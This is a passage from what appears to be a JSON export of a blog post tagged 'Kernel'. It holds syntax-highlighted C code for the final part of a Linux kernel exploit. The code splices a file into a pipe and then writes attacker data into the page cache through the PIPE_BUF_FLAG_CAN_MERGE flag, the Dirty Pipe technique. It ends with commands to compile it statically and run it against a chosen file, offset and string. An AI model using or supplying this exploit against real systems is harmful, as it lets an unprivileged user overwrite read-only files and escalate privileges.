class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;short splice\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* the following write will not create a new pipe_buffer, but</span></span><br><span class=\"line\"><span class=\"comment\">\t   will instead write into the page cache, because of the</span></span><br><span class=\"line\"><span class=\"comment\">\t   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class=\"line\">\tnbytes = write(p[<span class=\"number\">1</span>], data, data_size);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;write failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((<span class=\"type\">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;short write\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;It worked!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> EXIT_SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc exp.c -o exp --static</span><br><span class=\"line\">./exp file offset string</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Kernel"
            ]
        }
    ]
}